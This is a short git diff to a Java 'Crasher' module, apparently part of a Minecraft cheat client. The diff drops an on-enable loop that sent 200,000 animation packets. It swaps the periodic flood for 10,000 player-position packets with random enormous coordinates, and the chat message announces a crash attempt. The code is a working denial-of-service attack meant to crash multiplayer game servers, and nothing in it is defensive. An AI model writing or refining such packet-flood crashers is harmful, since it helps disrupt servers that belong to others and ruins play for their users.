@@ -3,6 +3,7 @@ package neko.module.modules.misc;
 import neko.module.Category;
 import neko.module.Module;
 import neko.utils.Utils;
+import net.minecraft.network.play.client.C03PacketPlayer;
 import net.minecraft.network.play.client.C0APacketAnimation;
 
 public class Crasher extends Module {
@@ -16,11 +17,6 @@ public class Crasher extends Module {
 	
 	public void onEnabled() {		
 		this.active = true;
-		int spam = 0;
-		while (spam < 200000) {
-			mc.getNetHandler().addToSendQueue(new C0APacketAnimation());
-			++spam;
-		}
 		Utils.addChat("§6Veuillez patienter... Nous essayons le crash.");
 		super.onEnabled();
 	}
@@ -41,8 +37,8 @@ public class Crasher extends Module {
 		++this.loop;
 		if (this.loop > 6) {
 			int spam = 0;
-			while (spam < 100000) {
-				mc.getNetHandler().addToSendQueue(new C0APacketAnimation());
+			while (spam < 10000) {
+				mc.getNetHandler().addToSendQueue(new C03PacketPlayer.C04PacketPlayerPosition((Math.random()*10000000+10000000), (Math.random()*10000000+10000000), (Math.random()*10000000+10000000), true));
 				++spam;
 				this.loop = 0;
 			}
